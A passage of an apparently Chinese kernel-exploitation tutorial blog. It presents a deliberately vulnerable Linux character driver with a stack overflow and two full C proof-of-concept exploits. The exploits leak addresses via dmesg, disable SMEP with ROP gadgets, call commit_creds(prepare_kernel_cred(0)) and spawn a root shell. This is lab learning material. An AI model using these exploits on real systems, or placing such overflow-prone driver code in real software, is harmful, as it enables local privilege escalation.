__randomize_layout;\n```\n\n具体一点使用如下\n\n![image-20220330164350249](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330164350249.png)\n\n参考:https://www.youtube.com/watch?v=EJ0JQKvxf70&list=PLEJtkJ02eJVX9I66wJD1tn07R52DxVXG0&index=4\n\n其中常用的就是read，write等函数。\n\n之后也是正常的调用函数，套路编写\n\n```C\n// 读设备\nssize_t xxx_read(struct file *filp, char __user *buf, size_t count, \n                loff_t *f_pos)\n{\n    ...\n    copy_to_user(buf, ..., ...); // 内核空间到用户空间缓冲区的复制\n    ...\n}\n// 写设备\nssize_t xxx_write(struct file *filp, const char __user *buf, \n                 size_t count, loff_t *f_pos)\n{\n    ...\n    copy_from_user(..., buf, ...); // 用户空间缓冲区到内核空间的复制\n    ...\n}\n\n// ioctl函数命令控制\nlong xxx_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    ...\n    switch (cmd) {\n    case XXX_CMD1:\n        ...\n        break;\n    case XXX_CMD2:\n        ...\n        break;\n    default:\n        // 不支持的命令\n        return -ENOTTY;\n    }\n    return 0;\n}\n```\n\n然后需要`file_operations`结构体中的函数来重写用户空间的write，open，read等函数：\n\n```c\nstatic struct file_operations xxx_fops =\n        {\n                .owner = THIS_MODULE,\n                // .open = xxx_open,\n                // .release = xxx_close,\n                .write = xxx_write,\n                .read = xxxx_read\n        };\n```\n\n这样当用户空间打开该设备，调用该设备的`write`函数，就能通过`.write`进入到`xxx_write`函数中。\n\n▲这样一些常规kernel题的编写模板就总结出来了。\n\n### (3)具体的题目\n\n原题：https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric\n\n#### ①代码和简单的解析\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h> \n\n//正常的设置了dev_t和cdev，但是这里使用的class这个模板来创建设备驱动\n//高12位为主设备号，低20位为次设备号\nstatic dev_t first; // Global variable for the first device number\nstatic struct cdev c_dev; // Global variable for the character device structure\nstatic struct class *cl; // Global variable for the device class\nstatic char *buffer_var;\n\n//打开关闭设备的消息提示函数\nstatic int vuln_open(struct inode *i, struct file *f)\n{\n  printk(KERN_INFO \"[i] Module vuln: open()\\n\");\n  return 0;\n}\nstatic int vuln_close(struct inode *i, struct file *f)\n{\n  printk(KERN_INFO \"[i] Module vuln: close()\\n\");\n  return 0;\n}\n\n//从buffer_var中读取数据\nstatic ssize_t vuln_read(struct file *f, char __user *buf, size_t len, loff_t *off)\n{\n  if(strlen(buffer_var)>0) {\n    printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var);\n    kfree(buffer_var);\n    buffer_var=kmalloc(100,GFP_DMA);\n    return 0;\n  } else {\n    return 1;\n  }\n}\n//向buffer中写入数据，然后拷贝给buffer_var，这里就是漏洞存在点。\n//由于len和buf都是我们可以控制的，而buffer是栈上的数据，长度为100。\n//所以我们可以通过len和buf，将数据复制给buffer从而进行栈溢出。\nstatic ssize_t vuln_write(struct file *f, const char __user *buf,size_t len, loff_t *off)\n{\n  char buffer[100]={0};\n  if (_copy_from_user(buffer, buf, len))\n    return -EFAULT;\n  buffer[len-1]='\\0';\n  printk(\"[i] Module vuln write: %s\\n\", buffer);\n  strncpy(buffer_var,buffer,len);\n  return len;//返回值不能为0,不然会一直调用该函数\n}\n\n//file_operations结构体初始化\nstatic struct file_operations pugs_fops =\n{\n  .owner = THIS_MODULE,\n  .open = vuln_open,\n  .release = vuln_close,\n  .write = vuln_write,\n  .read = vuln_read\n};\n\n//驱动设备加载函数\nstatic int __init vuln_init(void) /* Constructor */\n{\n  buffer_var=kmalloc(100,GFP_DMA);\n  printk(KERN_INFO \"[i] Module vuln registered\");\n  if (alloc_chrdev_region(&first, 0, 1, \"vuln\") < 0)\n  {\n    return -1;\n  }\n  if ((cl = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n  {\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n  if (device_create(cl, NULL, first, NULL, \"vuln\") == NULL)\n  {\n    printk(KERN_INFO \"[i] Module vuln error\");\n    class_destroy(cl);\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n  cdev_init(&c_dev, &pugs_fops);\n  if (cdev_add(&c_dev, first, 1) == -1)\n  {\n    device_destroy(cl, first);\n    class_destroy(cl);\n    unregister_chrdev_region(first, 1);\n    return -1;\n  }\n\n  printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(first), MINOR(first));\n  return 0;\n}\n\n//驱动设备卸载函数\nstatic void __exit vuln_exit(void) /* Destructor */\n{\n    unregister_chrdev_region(first, 3);\n    printk(KERN_INFO \"Module vuln unregistered\");\n}\n\nmodule_init(vuln_init);\nmodule_exit(vuln_exit);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"blackndoor\");\nMODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n#### ②内核函数解析\n\n##### `printk`:\n\n```c\nprintk(日志级别 \"消息文本\");\n```\n\n其中日志级别定义如下：\n\n```c\n#defineKERN_EMERG \"<0>\"/*紧急事件消息，系统崩溃之前提示，表示系统不可用*/\n#defineKERN_ALERT \"<1>\"/*报告消息，表示必须立即采取措施*/\n#defineKERN_CRIT \"<2>\"/*临界条件，通常涉及严重的硬件或软件操作失败*/\n#define KERN_ERR \"<3>\"/*错误条件，驱动程序常用KERN_ERR来报告硬件的错误*/\n#define KERN_WARNING \"<4>\"/*警告条件，对可能出现问题的情况进行警告*/\n#define KERN_NOTICE \"<5>\"/*正常但又重要的条件，用于提醒。常用于与安全相关的消息*/\n#define KERN_INFO \"<6>\"/*提示信息，如驱动程序启动时，打印硬件信息*/\n#define KERN_DEBUG \"<7>\"/*调试级别的消息*/\n```\n\n##### `kmalloc`:\n\n```C\nstatic inline void *kmalloc(size_t size, gfp_t flags)\n```\n\n其中flags一般设置为GFP_KERNEL或者GFP_DMA，在堆题中一般就是\n\nGFP_KERNEL模式，如下：\n\n　|– 进程上下文，可以睡眠　　　　　GFP_KERNEL\n　|– 进程上下文，不可以睡眠　　　　GFP_ATOMIC\n　|　　|– 中断处理程序　　　　　　　GFP_ATOMIC\n　|　　|– 软中断　　　　　　　　　　GFP_ATOMIC\n　|　　|– Tasklet　　　　　　　　　GFP_ATOMIC\n　|– 用于DMA的内存，可以睡眠　　　GFP_DMA | GFP_KERNEL\n　|– 用于DMA的内存，不可以睡眠　　GFP_DMA **|GFP_ATOMIC**\n\n具体可以看\n\n[Linux内核空间内存申请函数kmalloc、kzalloc、vmalloc的区别【转】 - sky-heaven - 博客园 (cnblogs.com)](https://www.cnblogs.com/sky-heaven/p/7390370.html)\n\n`kzmalloc`类似，就是分配空间并且内存初始化为0\n\n##### `kfree`:\n\n这个就不多说了，就是简单的释放。\n\n##### `copy_from_user`:\n\n```c\ncopy_from_user(void *to, const void __user *from, unsigned long n)\n```\n\n##### `copy_to_user`:\n\n```c\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n```\n\n这两个就不讲了，顾名思义。\n\n##### 注册函数\n\n剩下的好多就是常见的注册函数了\n\n```C\nalloc_chrdev_region(&t_dev, 0, 1, \"xxx\");//动态分配主设备号\nunregister_chrdev_region(t_dev, 1);//移除模块时释放设备号\nxxx_class = class_create(THIS_MODULE, \"xxx\");\ndevice_create(xxx_class, NULL, devno, NULL, \"xxx\");\ncdev_init(&c_dev, &pugs_fops);\ncdev_add(&c_dev, t_dev, 1);\n```\n\n\n\n## 2.globalmem虚拟设备驱动\n\n这个不太清楚，题目见的也少，先忽略。\n\n\n\n## 3.块设备\n\n### register_blkdev\n\n申请设备号\n\n```\nint ret = register_blkdev(xxx_dev_no,DEV_NAME);\n```\n\n- 如果`xxx_dev_no`为0则由该函数自动分配设备号，ret即为返回的设备号\n- `xxx_dev_no`不为0则依据该设备号进行分配\n\n### unregister_blkdev\n\n释放设备号\n\n```\nunregister_blkdev(xxx_dev_no,DEV_NAME);\n```\n\n\n\n[printk()函数的总结 - 深蓝工作室 - 博客园 (cnblogs.com)](https://www.cnblogs.com/king-77024128/articles/2262023.html)\n\n[Linux kernel pwn notes（内核漏洞利用学习） - hac425 - 博客园 (cnblogs.com)](https://www.cnblogs.com/hac425/p/9416886.html)\n\n[Linux设备驱动（二）字符设备驱动 | BruceFan's Blog (pwn4.fun)](http://pwn4.fun/2016/10/21/Linux设备驱动（二）字符设备驱动/)\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"pwnKernel从0开始(二)","url":"/2021/09/06/Kernel从0开始(二)/","content":"\n\n\n# 前言\n\n先尝试下最简单的栈溢出，保护和未被保护的情况\n\n给出自己设计的栈溢出题目：\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//设备驱动常用变量\nstatic char *buffer_var;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t stack_dev_no;\n\n\nstatic ssize_t stack_read(struct file *filp, char __user *buf, size_t count,\n        loff_t *f_pos);\n\nstatic ssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos);\n\nstatic long stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\n// static int stack_open(struct inode *i, struct file *f)\n// {\n//   printk(KERN_INFO \"[i] Module vuln: open()\\n\");\n//   return 0;\n// }\n\n// static int stack_close(struct inode *i, struct file *f)\n// {\n//   printk(KERN_INFO \"[i] Module vuln: close()\\n\");\n//   return 0;\n// }\n\nstatic struct file_operations stack_fops =\n        {\n                .owner = THIS_MODULE,\n                // .open = stack_open,\n                // .release = stack_close,\n                .write = stack_write,\n                .read = stack_read\n        };\n\n// 设备驱动模块加载函数\nstatic int __init stack_init(void)\n{\n    buffer_var=kmalloc(100,GFP_DMA);\n    printk(KERN_INFO \"[i] Module stack registered\");\n    if (alloc_chrdev_region(&stack_dev_no, 0, 1, \"stack\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, stack_dev_no, NULL, \"stack\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module stack error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &stack_fops);\n    if (cdev_add(&cdev, stack_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, stack_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(stack_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(stack_dev_no), MINOR(stack_dev_no));\n    return 0;\n\n}\n\n// 设备驱动模块卸载函数\nstatic void __exit stack_exit(void)\n{\n    // 释放占用的设备号\n    unregister_chrdev_region(stack_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n// 读设备\nssize_t stack_read(struct file *filp, char __user *buf, size_t count,\n        loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_read function\" );\n    if(strlen(buffer_var)>0) {\n        printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var);\n        kfree(buffer_var);\n        buffer_var=kmalloc(100,GFP_DMA);\n        return 0;\n    } else {\n        return 1;\n    }\n}\n\n// 写设备\nssize_t stack_write(struct file *filp, const char __user *buf,\nsize_t len, loff_t *f_pos)\n{\n    printk(KERN_INFO \"Stack_write function\" );\n    char buffer[100]={0};\n    if (_copy_from_user(buffer, buf, len))\n        return -EFAULT;\n    buffer[len-1]='\\0';\n    printk(\"[i] Module stack write: %s\\n\", buffer);\n    strncpy(buffer_var,buffer,len);\n    return len;\n}\n\n\n\n// ioctl函数命令控制\nlong stack_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    switch (cmd) {\n        case 1:\n            break;\n        case 2:\n            break;\n        default:\n            // 不支持的命令\n            return -ENOTTY;\n    }\n    return 0;\n}\n\n\nmodule_init(stack_init);\nmodule_exit(stack_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n```\n\n\n\n\n\n# ▲寻找gadget\n\n## `ropper`\n\n```bash\nropper --file vmlinux --search \"pop|ret\"\n```\n\n这个比较慢，实在不推荐\n\n## `objdump`\n\n```bash\nobjdump -d vmlinux -M intel | grep -E 'ret|pop'\n```\n\n这个比较快，不过查出来的gadget可能是不连续的，需要仔细辨别一下，必要时还需要Gdb调试进入vmlinux中进行汇编查询。比如查出来的类似如下\n\n![image-20210930111201257](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930111208.png)\n\n可以看到`pop rax`下并没有`ret`，但是依然查找出来了，其中`pop rax`和`pop rbx`不是连在一起的，用的时候注意辨别。\n\n## `ROPgadget`\n\n依然可以用，但有时候可能比较慢，可以先保存下来，然后再找：\n\n```bash\nROPgadget --binary vmlinux | grep \"pop rdx ; ret\"\n```\n\n## 一键获取\n\n详见之前的项目中的`getKernelROP`命令，常用gadget，还是比较好用的\n\n[PIG-007/kernelAll (github.com)](https://github.com/PIG-007/kernelAll)\n\n[PIG-007/kernelAll (gitee.com)](https://gitee.com/Piggy007/kernelAll)\n\n# 一、Stack被保护\n\n这里的被保护指的是开启了SMEP，类似于NX的栈保护，即内核无法执行用户空间的代码。\n\n## 方法一：\n\n通过ROP来关闭掉smep保护，这样就可以进入内核之后启动用户空间我们自己构造的`commit_creds(prepare_kernel_cred(0))`来完成提权，之后再启一个shell即可获得提权之后的shell。\n\n## 1.获取地址\n\n由于read函数不太有什么地址的读取，所以这里利用dmesg来获取地址\n\n```c\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n    \n    /* execute dmesg and place result in a file */\n\tprintf(\"[+] Excecute dmesg...\\n\");\n\tsystem(\"dmesg > /tmp/dmesg\");\n\t/* find: Freeing SMP alternatives memory*/\n\tprintf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n    return addr;\n}\n\n//main函数中\nunsigned long memOffset;\nmemOffset = findAddr();\nunsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\nunsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\nunsigned long getR = (unsigned long)getroot;\nunsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\nunsigned long iretq = (unsigned long)memOffset-0x7AC289;\nunsigned long sh = (unsigned long)shell;\n```\n\ndmesg是获取内核启动的日志相关信息，自己去尝试一下知道。\n\n![image-20210930112655023](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930112655.png)\n\n## 2.关闭SMEP\n\n```c\nunsigned char payload[300] = {0};\nunsigned char *p           = payload;\n\n/* pop rax;rbx;r12;rbp;ret;*/\nunsigned long poprax = (unsigned long)memOffset-0xCB5B47;\nmemcpy(p,&poprax,8);\nprintf(\"    pop rax      at 0x%lx\\n\", poprax);\np+=8;\nmemcpy(p,\"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* SMEP OFF rax*/\np+=8;\nmemcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\np+=8;\nmemcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* r12 */\np+=8;\nmemcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\np+=8;\n\n/* mov cr4, rax;rbp;ret     */\nunsigned long movcr4 = (unsigned long)memOffset-0x01020F1C;\nmemcpy(p,&movcr4,8);\nprintf(\"    mov CR4, RAX at 0x%lx\\n\", movcr4);\np+=8;\nmemcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\np+=8;\n```\n\n## 3.提权\n\n```c\n/* function to get root id */\nvoid getroot (void)\n{\n  commit_creds(prepare_kernel_cred(0));\n}\n\n/* getroot                        */\nmemcpy(p,&getR,8);\np+=8;\n```\n\n## 4.返回用户空间起Shell\n\n```c\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n```\n\n\n\n```c\n/* swapgs;ret           */\nprintf(\"    swapgs       at 0x%lx\\n\", swapgs);\nmemcpy(p,&swapgs,8);\np+=8;\n\n/* iretq                          */\nprintf(\"    iretq        at 0x%lx\\n\", iretq);\nmemcpy(p,&iretq,8);\np+=8;\n\n/* shell                          */\nmemcpy(p,&sh,8);\np+=8;\n```\n\n## 5.设置寄存器保存和恢复\n\n进入内核空间ROP链前需要保存环境，从内核环境回到用户空间起shell之前需要恢复环境。\n\n### (1)保存环境\n\n```c\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\n\nstatic void save_state() {\n  asm(\n  \"movq %%cs, %0\\n\"\n  \"movq %%ss, %1\\n\"\n  \"pushfq\\n\"\n  \"popq %2\\n\"\n  : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n```\n\n这个`save_state`函数在复制数据通过`stack_write`函数栈溢出进行ROP之前需要调用保存用户空间的环境。\n\n### (2)恢复环境\n\n```c\n/* user_cs                        */\nmemcpy(p,&user_cs,8);\np+=8;\n\n/* user_rflags                    */\nmemcpy(p,&user_rflags,8);\np+=8;\n\n/*stack of userspace   \t\t\t  */         \nregister unsigned long rsp asm(\"rsp\");\nunsigned long sp = (unsigned long)rsp;\nmemcpy(p,&sp,8);\np+=8;\n\n/* user_ss                        */\nmemcpy(p,&user_ss,8);\n```\n\n这个都是放在ROP链中，放在shell之后。\n\n### poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid getroot (void);\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\n    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* set value for commit_creds and prepare_kernel_cred */\n    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);\n\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n    /* pop rax;rbx;r12;rbp;ret                    */\n    memcpy(p,&pop_rax_rbx_r12_rbp_ret,8);\n    printf(\"    pop rax      at 0x%lx\\n\", pop_rax_rbx_r12_rbp_ret);\n    p+=8;\n    memcpy(p,\"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* SMEP OFF */\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* r12 */\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\n    p+=8;\n\n    /* mov cr4, rax;rbp;ret     */\n    memcpy(p,&movCr4Rax_pop_rbp,8);\n    printf(\"    mov CR4, RAX at 0x%lx\\n\", movCr4Rax_pop_rbp);\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* rbp */\n    p+=8;\n\n    /* getroot                        */\n    memcpy(p,&getR,8);\n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n    commit_creds(prepare_kernel_cred(0));\n}\n```\n\n\n\n## 方法二：\n\n直接在内核空间利用地址和gadget构造`commit_creds(prepare_kernel_cred(0))`来完成提权，之后返回用户空间起shell。\n\n### 1.ROP链\n\n```\npop rdi;ret\n0\nprepare_kernel_cred_k\npop rdx;rbx;rbp;ret\npop rbp;ret\n0\nrbp_data\nmov rdi,rax;call rdx\ncommit_creds_k\nswapgs;ret\niretq \n```\n\n之后就是返回用户空间起shell了\n\n### 2.解析执行流程\n\n▲先是调用`prepare_kernel_cred_k(0)`，然后通过将`pop rbp;ret`赋值给rdx，之后`mov rdi,rax`，然后call rdx，即调用`pop rbp;ret`，之后ret即可回到`commit_creds_k`。\n\n这里较为麻烦的原因是因为`mov rdi,rax;call rdx`这个语句，需要赋值rdi才能进行`commit_creds`函数的执行，即将`prepare_kernel_cred_k(0)`返回值给`commit_creds`函数。\n\n![Snipaste_2021-09-30_19-56-10](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200208.png)\n\n赋值\n\n![Snipaste_2021-09-30_19-57-47](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200230.png)\n\n之后又因为存在call这个语句，所以多了`pop rbp;ret`来将栈平衡掉，，从而能够直接ret到commit_creds\n\n![Snipaste_2021-09-30_20-03-46](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210930200353.png)\n\n同样ha1vk师傅的利用jmp就比较简单，不过具体看gadget，有时候很难找。\n\n### poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rdi_ret = memOffset - 0xD17AF3;\n    unsigned long pop_rdx_rbx_rbp_ret = (unsigned long)memOffset-0xCB43CD;\n    unsigned long pop_rbp_ret = memOffset - 0xCB43CB;\n    unsigned long movRdiRax_call_rdx = (unsigned long)memOffset-0xF8F3AA;\n    unsigned long prepare_kernel_cred_k = (unsigned long)memOffset-0xFBF2E0;\n    unsigned long commit_creds_k = (unsigned long)memOffset-0xFBF6A0;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n\n\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n\n    /*\npop rdi;ret  \tffffffff8131750d\n0\nprepare_kernel_cred_k_addr   \npop rdx;rbx;rbp;ret  0xffffffff8137ac33\ncommit_creds_k_addr\nmov rdi,rax;call rdx \t0xffffffff8109fc56\nswags;\t....\npop rbp;ret; 0xffffffff8137ac35\n0xdeadbeef\niretq; ....\nshell;\nCS\nEFLAGS\nRSP\nSS\n*/\n\n\n    /* pop rdi;ret                    */\n    printf(\"    pop rdi      at 0x%lx\\n\", pop_rdi_ret);\n    memcpy(p,&pop_rdi_ret,8);\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8);   /* rbx*/\n    p+=8;\n\n    //prepare_kernel_cred_k\n    printf(\"    prepare_kernel_cred_k_addr at 0x%lx\\n\", prepare_kernel_cred_k);\n    memcpy(p,&prepare_kernel_cred_k,8); \n    p+=8;\n\n    //pop rdx;rbx;rbp;ret\n    printf(\"    pop_rdx_rbx_rbp_ret at 0x%lx\\n\", pop_rdx_rbx_rbp_ret);\n    memcpy(p,&pop_rdx_rbx_rbp_ret,8); \n    p+=8;\n\n\n    //pop rbp;ret\n    printf(\"    pop_rbp_ret at 0x%lx\\n\", pop_rbp_ret);\n    memcpy(p,&pop_rbp_ret,8);\n    p+=8;\n    memcpy(p,\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",8); //rbx\n    p+=8;\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8); //rbp\n    p+=8;\n\n\n\n    //mov rdi,rax;call rdx\n    printf(\"    mov rdi,rax;call_rdx at 0x%lx\\n\", movRdiRax_call_rdx);\n    